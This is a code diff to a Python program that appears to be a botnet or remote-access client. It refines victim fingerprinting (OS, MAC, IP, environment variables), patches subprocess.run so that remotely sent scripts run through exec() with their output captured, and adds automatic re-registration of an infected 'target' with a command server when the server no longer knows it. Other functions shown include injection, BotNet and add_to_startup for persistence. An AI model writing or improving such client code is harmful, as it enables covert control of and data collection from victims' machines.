@@ -305,98 +305,135 @@ def targetData(command, user_name=None, ID=None, threadPermisstion='Allow', thre
 
 
 
+original_run = subprocess.run
+
+def patched_run(*args, **kwargs):
+    """
+    Safe wrapper around subprocess.run that avoids
+    conflict between capture_output and stdout/stderr.
+    """
+
+    # Fix conflict (this caused your crash)
+    if kwargs.get("capture_output"):
+        if "stdout" in kwargs or "stderr" in kwargs:
+            kwargs.pop("capture_output")
+
+    return original_run(*args, **kwargs)
+
+# Apply patch
+subprocess.run = patched_run
+
+
 
 def is_android():
-    """Checks if the current operating system is Android."""
     return 'ANDROID_ROOT' in os.environ or os.path.exists('/system/build.prop')
 
+
 def get_os_name():
-    """Returns the name of the operating system."""
     if is_android():
-        v = CMD("getprop ro.build.version.release")
+        try:
+            v = subprocess.check_output(
+                ["getprop", "ro.build.version.release"],
+                encoding="utf-8"
+            ).strip()
+        except Exception:
+            v = "Unknown"
         return f'Android {v}'
     else:
         return pt.system()
 
+
+
 def format_mac(mac_int):
-    """Formats a MAC address from an integer."""
     return ':'.join(f'{(mac_int >> i) & 0xff:02x}' for i in range(40, -1, -8))
 
+
 def get_mac_address():
-    """Returns the MAC address of the host."""
     mac_int = uuid.getnode()
     is_random = (mac_int >> 40) & 0x02
     if is_random:
         return "Could not reliably determine"
     return format_mac(mac_int)
 
+
 def get_all_ip_addresses():
-    """Returns a list of all IP addresses associated with the host."""
     try:
         return list(set([socket.gethostbyname(socket.gethostname())]))
-    except:
+    except Exception:
         return ["Unavailable"]
 
+
 def get_environment_vars():
-    """Returns a dictionary of selected environment variables."""
     keys = ['PATH', 'HOME', 'USER', 'SHELL', 'LANG', 'OS', 'COMPUTERNAME', 'ANDROID_ROOT']
     return {key: os.environ.get(key, "Not set") for key in keys}
 
+
 def get_cpu_count():
-    """Returns the number of CPU cores available."""
     return os.cpu_count() or "Unavailable"
 
+
 def get_memory_info():
-    """Returns total and free memory in MB."""
     try:
         with open('/proc/meminfo') as f:
             lines = f.read().splitlines()
         total = next(int(x.split()[1]) for x in lines if x.startswith('MemTotal:')) // 1024
         free = next(int(x.split()[1]) for x in lines if x.startswith('MemFree:')) // 1024
         return f"{total} MB", f"{free} MB"
-    except:
+    except Exception:
         return "Unavailable", "Unavailable"
+
 
 def get_uptime():
     try:
         with open('/proc/uptime') as f:
             uptime_seconds = float(f.readline().split()[0])
             return str(datetime.timedelta(seconds=int(uptime_seconds)))
-    except:
+    except Exception:
         return "Unavailable"
 
+
+
 def get_cpu_info():
-    """Returns the CPU information of the system."""
-    if pt.processor():
-        return pt.processor().strip()
+    """Safe CPU detection across environments."""
+
+    # Try platform first (can fail due to subprocess patching)
+    try:
+        cpu = pt.processor()
+        if cpu:
+            return cpu.strip()
+    except Exception:
+        pass
+
+    # Fallback for Linux / Android
     try:
         with open('/proc/cpuinfo') as f:
             for line in f:
                 if "model name" in line.lower() or "hardware" in line.lower():
                     return line.split(":", 1)[1].strip()
-    except:
+    except Exception:
         pass
+
     return "Unavailable"
 
+
+
 def format_datetime(dt):
-    """Formats a datetime object into a human-readable string."""
     return dt.strftime("%Y-%m-%d %H:%M:%S (%A)")
 
+
 def print_pretty(title, data_dict):
-    """
-    Formats and prints a dictionary in a pretty way.
-    """
     output = f"\n===== {title} =====\n"
     max_len = max(len(k) for k in data_dict)
+
     for key in sorted(data_dict):
-       output+= f"  {key.ljust(max_len)} : {data_dict[key]}\n"
+        output += f"  {key.ljust(max_len)} : {data_dict[key]}\n"
+
     return output
 
+
+
 def sys_info():
-    """Collects and formats system information including OS, hardware, network, user environment, and date/time.
-    Returns:
-        dict: A dictionary containing formatted system information.
-    """
+
     # System Info
     system_info = {
         "OS"              : get_os_name(),
@@ -433,6 +470,7 @@ def sys_info():
         user = os.getlogin()
     except OSError:
         user = "Unavailable (no tty)"
+
     user_env = get_environment_vars()
     user_env.update({
         "Current User"    : user,
@@ -447,7 +485,7 @@ def sys_info():
         "UTC Time"        : format_datetime(datetime.datetime.utcnow())
     }
 
-    # Output all
+    # Format Output
     System_info = print_pretty("System Info", system_info)
     Hardware_info = print_pretty("Hardware Info", hardware_info)
     Network_info = print_pretty("Network Info", network_info)
@@ -455,13 +493,12 @@ def sys_info():
     Dt_info = print_pretty("Date & Time", dt_info)
 
     return f"""
-            {System_info}, 
-            {Hardware_info} 
-            {Network_info}
-            {User_env} 
-            {Dt_info}
-        """
-
+        {System_info}
+        {Hardware_info}
+        {Network_info}
+        {User_env}
+        {Dt_info}
+    """
 
 # os.system("clear")
 def opratingSystem():
@@ -470,14 +507,7 @@ def opratingSystem():
     Returns:
         str: The name of the operating system (e.g., 'Windows', 'Linux', 'Android').
     """
-    if platform == "win32":
-        return 'Windows'
-    else:
-        is_android = CMD('getprop ro.build.version.release')
-        if is_android == 'android decoding str is not supported':
-            return 'linux'
-        else:
-            return f'android {is_android}'
+    return get_os_name()
 
 
 def get_ip():
@@ -710,22 +740,33 @@ def injection(token,target_name , code_output=None, ID=None, pyload_name=None,me
 
 
 def code_excuter(script):
-    """
-    Executes a Python script and captures its output.
-    Args:
-        script (str): The Python script to execute.
-    Returns:
-        str: The output of the executed script or an error message if execution fails.
-    """
     try:
         output_buffer = io.StringIO()
-        with contextlib.redirect_stdout(output_buffer):
-            exec(script)
 
-        output = output_buffer.getvalue()
-        return output
-    except:
-        return "Error executing code. Please check the script for errors."
+        # Patch subprocess.run
+        original_run = subprocess.run
+
+        def patched_run(*args, **kwargs):
+            kwargs["capture_output"] = True
+            kwargs["text"] = True
+            result = original_run(*args, **kwargs)
+            print(result.stdout, end="")
+            if result.stderr:
+                print(result.stderr, end="")
+            return result
+
+        subprocess.run = patched_run
+
+        with contextlib.redirect_stdout(output_buffer), contextlib.redirect_stderr(output_buffer):
+            exec(script, {"__name__": "__main__"})
+
+        # Restore original
+        subprocess.run = original_run
+
+        return output_buffer.getvalue() or "No output from code execution."
+
+    except Exception as e:
+        return f"Error executing code: {str(e)}"
 
 def BotNet(target_name,apiToken):
     """
@@ -1034,6 +1075,8 @@ def Registor(target_name, apiToken):
             data = decrypt_payload(POST.json())
             targetData(command='create_target', user_name=data['target_name'])
             return data,POST.status_code
+        else:
+            return f"Registration failed with status code {POST.status_code}", POST.status_code
     except Exception as e:
         return f"Error during registration: {str(e)}", 500
     except requests.exceptions.RequestException as e:
@@ -1071,10 +1114,25 @@ def Instarction(target_name, apiToken):
             instruction = decrypt_payload(GET.json())
             return instruction
         else:
-            return {
-                'error': f"Unexpected status code {GET.status_code}",
-                'details': decrypt_payload(GET.json())
-            }
+            if GET.status_code == 404 and decrypt_payload(GET.json())['Message'] == 'not target found':
+                user_name = config.ID(n=10)
+                data, status_code = Registor(target_name=user_name, apiToken=apiToken)
+                if data == 'error':
+                    logger.info(f'Error during registration: {data}')
+                else:
+                    print(data)
+                    if status_code == 200:
+                        print("****",data)
+                        registor_target = targetData(command='create_target', ID=config.ID(n=5), user_name=data['target_name'])
+                        if registor_target == "Target was created successfully":
+                            logger.info(f'Target {data["target_name"]} was successfully registered')
+                        else:
+                            logger.info(f'Failed to register target: {registor_target}')
+            else: 
+                return {
+                    'error': f"Unexpected status code {GET.status_code}",
+                    'details': decrypt_payload(GET.json())
+                }
     except requests.exceptions.RequestException as e:
         return {
             'error': 'RequestException occurred',
@@ -1366,6 +1424,7 @@ def main():
             logger.error(f'An error occurred in main loop: {e}\n{traceback.format_exc()}')
             time.sleep(10)  # Wait before retrying in case of an error
             main()  # Restart the main function in case of an error
+    print('Thread permission is not Allow, exiting main loop.')
 
 
 def add_to_startup(app_name, app_path=None):
